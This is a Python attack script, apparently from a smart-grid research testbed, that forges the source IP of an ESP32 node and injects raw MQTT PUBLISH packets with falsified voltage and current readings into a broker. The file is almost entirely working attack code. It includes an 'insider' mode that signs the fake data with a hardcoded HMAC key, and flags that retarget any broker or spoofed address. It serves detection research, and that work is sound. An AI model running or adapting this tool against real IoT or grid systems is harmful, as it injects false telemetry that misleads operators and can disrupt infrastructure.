#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MODULE BRIEFING: attack_ip_spoof.py — IP Spoofing Attack Simulator        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  PURPOSE:   Simulate IP spoofing attacks against MQTT broker by sending    ║
║             raw TCP/IP packets with forged source IP address.              ║
║  INPUTS:    CLI args (duration, interval, scale factors, advanced mode)    ║
║  OUTPUTS:   Raw spoofed packets sent to MQTT broker on port 1883          ║
║  REQUIRES:  sudo, Scapy, Linux with raw socket permissions                ║
║  TARGET:    Raspberry Pi MQTT broker at 192.168.1.100                      ║
║  SPOOFS:    ESP32 node IP 192.168.1.101                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

RESEARCH DISCLAIMER:
    This script is written for academic research purposes only.
    It must only be used on networks and devices you own and control.
    IP spoofing on public networks or networks you do not own is illegal.
    This testbed is isolated to a local lab network (192.168.1.0/24).
    Running this requires: sudo, Scapy, and Linux with raw socket permissions.

WHAT THIS SCRIPT DOES:
    1. Crafts raw TCP/IP packets with source IP forged to 192.168.1.101 (ESP32)
    2. Encapsulates MQTT PUBLISH messages with falsified energy readings
    3. Sends them to the MQTT broker at 192.168.1.100:1883
    4. The broker sees packets that appear to come from the real ESP32
    5. The HMAC signature is intentionally WRONG (attacker doesn't have the key)
    6. Optional --advanced-mode: compute valid HMAC (simulates insider threat)

WHY THIS IS DETECTABLE:
    - HMAC signature is invalid (unless --advanced-mode)
    - TCP TTL from Linux (64) differs from ESP32 FreeRTOS (128)
    - TCP window size differs between Linux and ESP32 lwIP stack
    - Packet timing may deviate from ESP32's 5-second interval
    - Duplicate source MAC addresses visible on local LAN
"""

import argparse
import json
import struct
import sys
import time
import hmac
import hashlib
from datetime import datetime

try:
    from scapy.all import IP, TCP, Raw, send, RandShort, RandInt, conf
except ImportError:
    print("[ERROR] Scapy is not installed. Run: pip install scapy")
    print("[ERROR] This script also requires sudo/root privileges.")
    sys.exit(1)

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════

BROKER_IP = "192.168.1.100"
BROKER_PORT = 1883
ESP32_IP = "192.168.1.101"  # The IP we're spoofing
MQTT_TOPIC = "smartgrid/node01/telemetry"

# HMAC key — only used in --advanced-mode (insider threat simulation)
HMAC_SECRET_KEY = "smartgrid_secret_key_2025"

# Baseline "real" readings that we'll scale to create falsified data
BASELINE_VOLTAGE = 230.0
BASELINE_CURRENT = 0.261
BASELINE_POWER_FACTOR = 0.99
BASELINE_FREQUENCY = 50.0
BASELINE_ENERGY = 1234

# ═══════════════════════════════════════════════════════
# MQTT PROTOCOL HELPERS
# ═══════════════════════════════════════════════════════

def encode_mqtt_remaining_length(length: int) -> bytes:
    """
    Encode MQTT remaining length using variable-length encoding.
    
    MQTT uses a variable-length encoding scheme where each byte uses
    7 bits for the value and 1 bit (MSB) as a continuation flag.
    Max 4 bytes, max value 268,435,455.
    """
    encoded = bytearray()
    while True:
        byte = length % 128
        length = length // 128
        if length > 0:
            byte |= 0x80  # Set continuation bit
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)


def build_mqtt_publish_frame(topic: str, payload: str) -> bytes:
    """
    Manually construct an MQTT PUBLISH packet (QoS 0, no retain).
    
    MQTT PUBLISH frame structure:
        Byte 0:     0x30 (PUBLISH fixed header: type=3, DUP=0, QoS=0, RETAIN=0)
        Bytes 1-N:  Remaining length (variable-length encoded)
        Next 2:     Topic length (big-endian uint16)
        Next M:     Topic string (UTF-8)
        Rest:       Payload (UTF-8 JSON string)
    
    We build this manually because we're injecting at the TCP level,
    not using a proper MQTT client library.
    """
    topic_bytes = topic.encode('utf-8')
    payload_bytes = payload.encode('utf-8')
    
    # Topic length (2 bytes, big-endian)
    topic_length = struct.pack('!H', len(topic_bytes))
    
    # Variable header + payload
    remaining = topic_length + topic_bytes + payload_bytes
    remaining_length = encode_mqtt_remaining_length(len(remaining))
    
    # Fixed header: 0x30 = PUBLISH, QoS 0, no retain
    fixed_header = bytes([0x30])
    
    return fixed_header + remaining_length + remaining


# ═══════════════════════════════════════════════════════
# PAYLOAD GENERATION
# ═══════════════════════════════════════════════════════

def compute_hmac_sha256(payload_str: str, key: str) -> str:
    """Compute HMAC-SHA256 of a canonical JSON string."""
    return hmac.new(
        key.encode('utf-8'),
        payload_str.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()


def build_falsified_payload(seq: int, voltage_scale: float = 1.5,
                            current_scale: float = 0.1,
                            advanced_mode: bool = False) -> str:
    """
    Build a JSON payload with falsified energy readings.
    
    In normal mode: HMAC is intentionally WRONG (tests HMAC detection)
    In advanced mode: HMAC is VALID (tests detection without HMAC — insider threat)
    
    Args:
        seq: Sequence number for this packet
        voltage_scale: Multiplier for voltage (1.5 = 345V instead of 230V)
        current_scale: Multiplier for current (0.1 = 0.026A instead of 0.261A)
        advanced_mode: If True, compute valid HMAC (insider threat simulation)
    
    Returns:
        JSON string ready for MQTT payload
    """
    voltage = round(BASELINE_VOLTAGE * voltage_scale, 1)
    current = round(BASELINE_CURRENT * current_scale, 3)
    power = round(voltage * current * BASELINE_POWER_FACTOR, 1)
    
    # Build payload dict — keys MUST be alphabetically sorted to match
    # ArduinoJson's default serialization order on the ESP32
    payload_data = {
        "alarm": 0,
        "crc_errors": 0,
        "current_A": current,
        "energy_Wh": BASELINE_ENERGY,
        "frequency_Hz": BASELINE_FREQUENCY,
        "node_id": "node_01",
        "power_W": power,
        "power_factor": BASELINE_POWER_FACTOR,
        "rssi_dBm": -55,
        "seq": seq,
        "timestamp": int(time.time()),
        "voltage_V": voltage,
    }
    
    if advanced_mode:
        # Insider threat: compute VALID HMAC using the leaked key
        canonical = json.dumps(payload_data, sort_keys=True, separators=(',', ':'))
        valid_hmac = compute_hmac_sha256(canonical, HMAC_SECRET_KEY)
        payload_data["hmac"] = valid_hmac
    else:
        # Normal spoof: deliberately wrong HMAC (will be caught by HMAC verifier)
        payload_data["hmac"] = "INVALID_HMAC_" + "0" * 50
    
    return json.dumps(payload_data, sort_keys=True, separators=(',', ':'))


# ═══════════════════════════════════════════════════════
# PACKET CRAFTING AND SENDING
# ═══════════════════════════════════════════════════════

def send_spoofed_packet(target_ip: str, target_port: int,
                        spoofed_src_ip: str, mqtt_bytes: bytes,
                        verbose: bool = False) -> bool:
    """
    Craft and send a raw IP packet with forged source IP.
    
    The packet structure:
        IP layer:  src=spoofed_src_ip (ESP32), dst=target_ip (broker)
        TCP layer: random sport, dport=1883, flags=PA (PUSH+ACK)
        Payload:   MQTT PUBLISH frame bytes
    
    Note: This is a raw packet injection. It does NOT establish a proper
    TCP connection (no 3-way handshake). The broker's TCP stack may drop
    these packets, but Mosquitto's MQTT parser may still process them
    in some configurations.
    """
    try:
        ip_layer = IP(src=spoofed_src_ip, dst=target_ip)
        tcp_layer = TCP(
            sport=RandShort(),
            dport=target_port,
            flags="PA",
            seq=RandInt(),
            ack=RandInt()
        )
        packet = ip_layer / tcp_layer / Raw(load=mqtt_bytes)
        send(packet, verbose=False)
        return True
    except PermissionError:
        print("[ERROR] Permission denied. Run with sudo!")
        return False
    except Exception as e:
        print(f"[ERROR] Failed to send packet: {e}")
        return False


# ═══════════════════════════════════════════════════════
# ATTACK BANNER
# ═══════════════════════════════════════════════════════

def print_banner(args):
    """Print attack configuration banner."""
    mode = "ADVANCED (valid HMAC — insider threat)" if args.advanced_mode else "STANDARD (invalid HMAC)"
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║           SmartGrid IP Spoofing Attack Simulator            ║
║                  RESEARCH USE ONLY                          ║
╠══════════════════════════════════════════════════════════════╣
║  Target Broker:     {BROKER_IP}:{BROKER_PORT:<24}║
║  Spoofed Source IP: {ESP32_IP:<41}║
║  MQTT Topic:        {MQTT_TOPIC:<41}║
║  Duration:          {args.duration}s{' '*(39-len(str(args.duration)))}║
║  Interval:          {args.interval}s{' '*(39-len(str(args.interval)))}║
║  Voltage Scale:     {args.voltage_scale}x{' '*(38-len(str(args.voltage_scale)))}║
║  Current Scale:     {args.current_scale}x{' '*(38-len(str(args.current_scale)))}║
║  Mode:              {mode:<41}║
╚══════════════════════════════════════════════════════════════╝
""")


# ═══════════════════════════════════════════════════════
# MAIN ATTACK LOOP
# ═══════════════════════════════════════════════════════

def run_attack(args):
    """Execute the IP spoofing attack loop."""
    print_banner(args)
    
    start_time = time.time()
    end_time = start_time + args.duration
    seq = 1000  # Start from a high seq to differentiate from real ESP32
    packets_sent = 0
    packets_failed = 0
    
    print(f"[ATTACK] Starting IP spoof attack at {datetime.now().strftime('%H:%M:%S')}")
    print(f"[ATTACK] Will send spoofed packets every {args.interval}s for {args.duration}s")
    print("-" * 70)
    
    try:
        while time.time() < end_time:
            # Build falsified payload
            payload_json = build_falsified_payload(
                seq=seq,
                voltage_scale=args.voltage_scale,
                current_scale=args.current_scale,
                advanced_mode=args.advanced_mode
            )
            
            # Build MQTT PUBLISH frame
            mqtt_frame = build_mqtt_publish_frame(MQTT_TOPIC, payload_json)
            
            # Send spoofed packet
            success = send_spoofed_packet(
                target_ip=BROKER_IP,
                target_port=BROKER_PORT,
                spoofed_src_ip=ESP32_IP,
                mqtt_bytes=mqtt_frame
            )
            
            if success:
                packets_sent += 1
                remaining = int(end_time - time.time())
                ts = datetime.now().strftime('%H:%M:%S')
                
                # Parse payload for display
                data = json.loads(payload_json)
                hmac_status = "VALID (insider)" if args.advanced_mode else "INVALID"
                
                print(f"[SPOOF] {ts} | Pkt #{packets_sent:>4} | "
                      f"src={ESP32_IP}(FORGED) -> {BROKER_IP}:{BROKER_PORT} | "
                      f"V={data['voltage_V']:.1f} I={data['current_A']:.3f} "
                      f"P={data['power_W']:.1f} | "
                      f"HMAC={hmac_status} | "
                      f"remaining={remaining}s")
            else:
                packets_failed += 1
                if packets_failed > 3:
                    print("[ABORT] Too many send failures. Check permissions (sudo) and network.")
                    break
            
            seq += 1
            
            # Wait for next interval
            time.sleep(args.interval)
    
    except KeyboardInterrupt:
        print("\n[ABORT] Attack interrupted by user (Ctrl+C)")
    
    # Summary
    elapsed = time.time() - start_time
    print("-" * 70)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    ATTACK SUMMARY                           ║
╠══════════════════════════════════════════════════════════════╣
║  Duration:        {elapsed:.1f}s{' '*(41-len(f'{elapsed:.1f}'))}║
║  Packets Sent:    {packets_sent:<42}║
║  Packets Failed:  {packets_failed:<42}║
║  Avg Interval:    {elapsed/max(packets_sent,1):.2f}s{' '*(40-len(f'{elapsed/max(packets_sent,1):.2f}'))}║
║  Spoofed IP:      {ESP32_IP:<42}║
╚══════════════════════════════════════════════════════════════╝
""")


# ═══════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="SmartGrid IP Spoofing Attack Simulator (Research Only)",
        epilog="MUST be run with sudo on Linux. Lab network only."
    )
    parser.add_argument('--duration', type=int, default=60,
                        help='Attack duration in seconds (default: 60)')
    parser.add_argument('--interval', type=float, default=5.0,
                        help='Seconds between spoofed packets (default: 5.0)')
    parser.add_argument('--voltage-scale', type=float, default=1.5,
                        help='Voltage multiplier for falsified data (default: 1.5)')
    parser.add_argument('--current-scale', type=float, default=0.1,
                        help='Current multiplier for falsified data (default: 0.1)')
    parser.add_argument('--advanced-mode', action='store_true',
                        help='Compute VALID HMAC (insider threat simulation for Scenario 5)')
    parser.add_argument('--target-ip', type=str, default=BROKER_IP,
                        help=f'Target broker IP (default: {BROKER_IP})')
    parser.add_argument('--spoof-ip', type=str, default=ESP32_IP,
                        help=f'IP to spoof/impersonate (default: {ESP32_IP})')
    
    args = parser.parse_args()
    
    # Safety check
    if not sys.platform.startswith('linux'):
        print("[WARNING] Raw socket spoofing works best on Linux.")
        print("[WARNING] On other platforms, packets may not be sent correctly.")
    
    # Check for root
    import os
    if os.geteuid() != 0:
        print("[ERROR] This script requires root privileges.")
        print("[ERROR] Run with: sudo python3 attack_ip_spoof.py")
        sys.exit(1)
    
    # Update globals if custom IPs provided
    global BROKER_IP, ESP32_IP
    BROKER_IP = args.target_ip
    ESP32_IP = args.spoof_ip
    
    run_attack(args)


if __name__ == "__main__":
    main()
